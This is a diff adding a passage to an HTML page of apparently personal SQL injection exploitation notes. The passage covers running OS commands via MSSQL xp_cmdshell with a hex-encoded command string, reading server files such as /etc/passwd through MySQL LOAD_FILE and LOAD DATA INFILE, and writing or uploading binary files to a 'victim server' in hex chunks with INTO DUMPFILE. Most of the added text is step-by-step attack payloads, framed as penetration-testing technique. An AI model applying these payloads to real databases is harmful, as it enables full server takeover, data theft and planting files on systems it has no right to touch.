@@ -554,6 +554,88 @@ for example the final result will be: something similar like the following
 
 RESULT IN HEX: 0x640069007200200063003a005c00
 
+STEP2:
+it is needed to instance a variable with the command string we have just created, and then we pass it to the xp_cmdshell
+payload:
+declare @t nvarchar(4096) set @t=0x640069007200200063003a005c00 insert into temptable (output) EXEC master.dbo.xp_cmdshell @t;
+
+STEP3: 
+to read the files it is needed to dump the data, can be used any of the dumping techniques, prev used. 
+
+STEP4:
+remove the temp table you created for that.
+payload:
+DROP TABLE temptable;
+
+....> advanced MySQL exploitation:
+
+MySQL is another DBMS which provided some advanced features. most of the features rely on the file privilege that "gives you permission to read and write files on the server host"
+
+-file privs can be granted to any MySQL user depending on the web app needs. always granted to MySQL "root" user on Linux & Windows.
+meaning that, if an app connects to the database as root, exploiting a SQL injection will lead not only to data compromise but also, to a full server takeover. 
+
+>> READ A FILE
+
+..it is possible by using LOAD_FILE function:
+
+SELECT LOAD_FILE('text_file_path');
+
+..to read the binary file , it is possible to do it with the function HEX, sample:
+payload:
+
+mysql> SELECT HEX(LOAD_FILE('<text_file_path>'));
+
+-> using this method you can convert any binary file to a long hex string that you can use to steal any data from the server. 
+-> also, possible to parse the content of a file and tell MySQL how to distinguish a record from another one.
+
+payload:
+mysql> CREATE TABLE table_name(output longtext);
+
+mysql> LOAD DATA INFILE '/etc/passwd' INTO TABLE table_name FIELDS TERMINATED BY '\n' (output);
+
+description command:
+
+"/etc/passwd" = file to read
+"table_name" = name of the table
+"output" = column name
+
+> WRITE TO FILE A QUERY RESULT
+
+using the SELECT .. INTO DUMPFILE statement, there's a chance to write to a file the result of a query. can be used to download huge query results via web app and to upload penetration tester supplied data to the server. 
+payload: 
+
+mysql> SELECT <fields> FROM <table> INTO DUMPFILE '<output file path>';
+
+> UPLOAD BINARY FILE
+
+you have to find a way to insert its content into a table on the victim machine, then dump the table content to a file on the server file system. file needs to be locally on the host.
+
+STEP 1: convert it into an hex-string
+
+mysql> SELECT HEX(LOAD_FILE('/file/to/read-load')) INTO DUMPFILE '/file/to/save/output.dmp';
+
+STEP 2: load it into the table
+
+mysql> LOAD DATA INFILE '/file/path/of/file/to/load.dmp' INTO TABLE table_name FIELDS TERMINATED BY 'sOmErandOM' LINES TERMINATED BY 'oTHerRnD' (data);
+
+STEP3: test it is the same file by using INTO DUMPFILE to recreate the same
+
+mysql> SELECT UNHEX(data) FROM table_name INTO DUMPFILE 'file/to/write/test.dmp';
+
+STEP4: compare SHA256 on both files. the initial file that was loaded and the file test you are generating to test. 
+
+if everything is good, file can be uploaded to the victim server, but first you need to split the dumpfile into chunks of 1024 bytes and then insert them into a table field.
+
+sample: first you have to perform an INSERT with the first chunk and next you have to update the field by adding the other chunks.
+
+payload:
+
+INSERT INTO victim_table_name(field) VALUES(HEX_CODE_CONVERTED);
+UPDATE victim_table_name SET field=CONCAT(data,HEX_CODE_CONVERTED);
+UPDATE victim_table_name SET field=CONCAT(data,HEX_CODE_CONVERTED);
+same instruction until there's no more chunks to add.
+finally: you can write the file on the target system by executing...
+SELECT <victim_field> FROM <victim_table> WHERE <optional conditions> INTO DUMPFILE '<output path>';
 
 </center>
 </body>
